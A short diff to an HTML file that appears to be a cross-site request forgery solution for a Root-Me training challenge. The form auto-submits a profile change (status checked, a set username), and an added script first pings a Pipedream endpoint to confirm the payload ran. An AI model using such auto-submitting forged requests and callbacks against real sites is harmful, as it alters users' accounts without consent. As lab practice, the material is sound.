@@ -1,5 +1,16 @@
 <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST"> 
-  <input type="checkbox" name="status" checked> 
+  <input type="checkbox" name="status" checked>
   <input type="text" name="username" value="tonioshast">
-<script> document.forms[0].submit(); </script>
+</form>
+
+<script>
+  // Ping vers Pipedream
+  new Image().src = "https://eo24g6niho492nt.m.pipedream.net/ping?ok=1&ts=" + Date.now();
+
+  // Laisse 300 ms au ping pour partir, puis soumets le formulaire
+  setTimeout(function() {
+    document.forms[0].submit();
+  }, 300);
+</script>
+
 
